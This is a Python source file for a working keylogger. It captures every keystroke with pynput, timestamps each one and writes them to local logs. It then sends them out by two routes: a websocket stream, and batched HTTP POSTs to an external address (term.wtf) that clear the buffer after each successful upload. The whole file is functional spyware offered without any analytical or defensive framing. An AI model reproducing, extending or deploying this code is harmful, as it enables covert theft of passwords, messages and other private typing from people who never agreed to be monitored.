import asyncio
import json
import logging
import time
from concurrent.futures.thread import ThreadPoolExecutor
from time import sleep
from time import strftime

import requests
import websockets
from pynput.keyboard import Listener

debug = True
formatter = logging.Formatter('%(asctime)s : %(message)s')


def setup_logger(name, log_file, level=logging.DEBUG):
    # To setup as many loggers as you want
    # logger = setup_logger('first_logger', 'first_logfile.log')
    # logger.info('This is just info message')

    handler = logging.FileHandler(log_file)
    handler.setFormatter(formatter)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)

    return logger


def time_stamp():
    ts = strftime('%Y-%m-%d_%H:%M:%S')
    return f'{ts}'


class Presses:
    def __init__(self):
        self.http_presses = []
        self.ws_presses = []
        self.logger = setup_logger('Presses', 'keylogger.log')
        self.logger.debug('Init Presses')

    def append(self, data):
        self.http_presses.append(data)
        self.ws_presses.append(data)

    def http_get(self):
        return self.http_presses

    def ws_que(self):
        if self.ws_presses.__len__():
            return self.ws_presses.pop(0)
        return None

    def flush(self):
        self.http_presses = []
        self.logger.debug('Flushing que ... ')


class KeyLogger:
    def __init__(self):
        self.logger = setup_logger('keylogger', 'results.log')

    def keypress(self, key):
        self.logger.info('"{0}'.format(key))
        t = time_stamp()
        _key = str(key)
        entry = json.loads(json.dumps({"time": t, "key": _key}))
        presses.append(entry)

    def log_keys(self):
        with Listener(on_press=self.keypress) as listener:
            listener.join()


class WsStream:
    def __init__(self, uri):
        self.uri = uri
        self.logger = setup_logger('WsStream', 'keylogger.log')

    async def ws_stream(self):
        uri = self.uri
        while True:
            try:
                async with websockets.connect(uri) as websocket:
                    while True:
                        msg = presses.ws_que()
                        if msg is not None:
                            await websocket.send(str(msg))
            except ConnectionRefusedError:
                self.logger.debug('Could not connect to ws server, reconnecting ... ')
                time.sleep(1)
            except websockets.ConnectionClosedError:
                self.logger.debug('Connection closed, reconnecting ..')
                time.sleep(1)
            except Exception as err:
                self.logger.debug('Websocket error:', err)


class HttpLogger:
    def __init__(self, url):
        self.url = url
        self.logger = setup_logger('HttpLogger', 'keylogger.log')

    def http_uploader(self):
        while True:
            if debug:
                sleep(10)
            else:
                sleep(600)
            key_data = presses.http_get()
            if debug:
                print(key_data)
            if not key_data.__len__():
                self.logger.debug('Passing ... ')
                pass
            else:
                self.logger.debug('Uploading')
                try:
                    ret = requests.post(url=self.url, json=key_data)
                except Exception as err:
                    self.logger.debug(err)
                else:
                    if ret.status_code == 200:
                        self.logger.debug('Flushing ... ')
                        presses.flush()


def main(http_enabled=False, ws_enabled=True):
    global presses
    executor = ThreadPoolExecutor(max_workers=3)
    presses = Presses()
    key_logger = KeyLogger()
    http_log = HttpLogger(url='https://term.wtf/')
    ws = WsStream(uri="ws://localhost:8765")

    if debug:
        print('Starting KeyLogger')
    executor.submit(key_logger.log_keys)
    if debug and http_enabled:
        print('Starting HTTP Uploader')
    if http_enabled:
        executor.submit(http_log.http_uploader)
    if debug and ws_enabled:
        print('Starting websocket stream')

    asyncio.get_event_loop().run_until_complete(ws.ws_stream())


if __name__ == "__main__":
    main(http_enabled=False, ws_enabled=True)
